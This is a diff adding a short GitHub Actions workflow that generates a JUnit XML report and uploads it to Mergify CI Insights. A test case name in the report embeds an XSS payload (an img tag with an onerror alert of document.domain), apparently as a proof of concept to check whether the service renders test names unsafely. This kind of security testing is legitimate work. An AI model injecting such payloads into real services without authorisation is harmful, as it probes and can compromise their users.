@@ -1,0 +1,23 @@
+name: CI Insights Test Upload
+on:
+  push:
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Create JUnit XML with test payload
+        run: |
+          mkdir -p test-results
+          cat > test-results/junit.xml << 'EOF'
+          <?xml version="1.0" encoding="UTF-8"?>
+          <testsuites>
+          <testsuite name="XSSTestSuite" tests="1" failures="0" time="0.1">
+          <testcase classname="XSSTest" name="&lt;img src=x onerror=alert(document.domain)&gt; test case" time="0.1"></testcase>
+          </testsuite>
+          </testsuites>
+          EOF
+      - name: Upload to Mergify CI Insights
+        uses: mergifyio/gha-mergify-ci@v8
+        with:
+          token: ${{ secrets.MERGIFY_TOKEN }}
+          report_path: test-results/junit.xml
